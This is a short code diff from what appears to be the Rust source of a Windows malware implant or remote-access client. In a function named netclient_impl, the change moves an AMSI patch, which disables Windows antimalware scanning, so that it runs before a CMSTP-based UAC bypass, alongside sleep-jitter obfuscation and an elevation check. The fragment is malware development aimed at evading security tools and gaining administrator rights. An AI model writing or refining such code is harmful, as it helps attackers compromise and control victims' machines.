@@ -664,6 +664,8 @@ fn rand_range(min: u64, max: u64) -> u64 {
 
 #[unsafe(no_mangle)]
 async fn netclient_impl() -> c_int {
+    #[cfg(target_os = "windows")]
+    amsi_patch::amsi_patch();
     obfuscate::sleep_jitter_default();
     #[cfg(target_os = "windows")]
     unsafe {
@@ -675,8 +677,7 @@ async fn netclient_impl() -> c_int {
     #[cfg(target_os = "windows")]
     uac_cmstp::execute(&exe);
     obfuscate::sleep_jitter_default();
-    #[cfg(target_os = "windows")]
-    amsi_patch::amsi_patch();
+    
     #[cfg(target_os = "windows")]
     use is_elevated;
     #[cfg(target_os = "windows")]
